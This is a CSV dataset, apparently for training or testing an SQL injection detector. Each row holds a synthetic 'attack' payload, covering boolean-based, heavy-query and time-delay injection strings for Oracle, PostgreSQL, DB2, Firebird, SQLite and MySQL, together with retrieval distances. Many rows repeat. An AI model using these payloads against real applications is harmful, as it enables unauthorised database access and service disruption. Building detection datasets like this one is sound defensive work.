id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001059,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,6.680752330570004
CTGAN_001060,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,5.118986469356537
CTGAN_001061,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,6.7438156895908525
CTGAN_001062,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000061,7.069350527135449
CTGAN_001063,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,6.236778681914074
CTGAN_001064,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,4.438132991863046
CTGAN_001065,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,6.342567753080908
CTGAN_001066,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,8.459083377600386
CTGAN_001067,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,5.278214253002796
CTGAN_001068,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,5.515140108730485
CTGAN_001069,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000054,7.530227991675816
CTGAN_001070,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,5.475434393943193
CTGAN_001071,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,5.312884275700138
CTGAN_001072,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,5.895401296196194
CTGAN_001073,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,5.793448880976938
CTGAN_001074,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.097934835893084
CTGAN_001075,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,4.0671817982273994
CTGAN_001076,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000102,5.117802328647984
CTGAN_001077,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,6.1495547255985645
CTGAN_001078,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,4.778689854471074
CTGAN_001079,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,6.071426798106992
CTGAN_001080,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,5.959390742403161
CTGAN_001081,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,6.5576765702663735
CTGAN_001082,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000011,4.8512574599070675
CTGAN_001083,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,7.855987851977816
CTGAN_001084,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,7.194253854973805
CTGAN_001085,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,7.4309088476391905
CTGAN_001086,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,6.732155004322138
CTGAN_001087,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000058,6.219886558535173
CTGAN_001088,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,5.995014101719423
CTGAN_001089,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,5.474835445768146
CTGAN_001090,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,6.762712819079438
CTGAN_001091,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,6.45405282159224
CTGAN_001092,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,4.4225672336772925
CTGAN_001093,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.4730803423237235
CTGAN_001094,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,6.608373046878936
CTGAN_001095,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,5.976088182542336
CTGAN_001096,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,6.609311344128461
CTGAN_001097,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000061,5.8228077272372545
CTGAN_001098,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000032,7.285566674085153
CTGAN_001099,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,7.964912181707513
CTGAN_001100,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,7.594386979603725
CTGAN_001101,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,7.804350201917754
CTGAN_001102,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000071,9.873509569793
CTGAN_001103,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,6.133698849806237
CTGAN_001104,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,5.481512365399364
CTGAN_001105,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000108,5.00142120041326
CTGAN_001106,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,4.960876910571032
CTGAN_001107,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,7.752815383734201
CTGAN_001108,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.0187809833174155
CTGAN_001109,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.2189252016366074
CTGAN_001110,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,6.5212597530240295
CTGAN_001111,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,10.122275797164724
CTGAN_001112,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,5.072251584967376
CTGAN_001113,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.3336666352741675
CTGAN_001114,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,6.287819888475226
CTGAN_001115,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,7.228242397392718
CTGAN_001116,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,4.996029580968056
CTGAN_001117,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.097342945708312
CTGAN_001118,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,5.771432733867803
CTGAN_001119,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,6.358310667039424
CTGAN_001120,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,5.897686783469189
CTGAN_001121,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000058,5.93796405907094
CTGAN_001122,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,7.976118526960739
CTGAN_001123,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000147,6.510095344355575
CTGAN_001124,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,6.286722139012273
CTGAN_001125,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000108,7.015728427886248
CTGAN_001126,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,6.000249671705592
CTGAN_001127,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,6.0606050145339445
CTGAN_001128,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,8.380699354993284
CTGAN_001129,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000102,5.230454113999859
CTGAN_001130,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.772281561651986
CTGAN_001131,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000032,6.134226744942546
CTGAN_001132,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,5.84749697068386
CTGAN_001133,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,6.198918766754964
CTGAN_001134,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,6.119544027502622
CTGAN_001135,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,4.940044690607302
CTGAN_001136,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,4.777015239091727
CTGAN_001137,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,8.729527902437802
CTGAN_001138,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,7.4850211615166335
CTGAN_001139,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000077,9.097226795462113
CTGAN_001140,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,5.776634112476332
CTGAN_001141,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,3.0842184957260077
CTGAN_001142,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,4.89177317292262
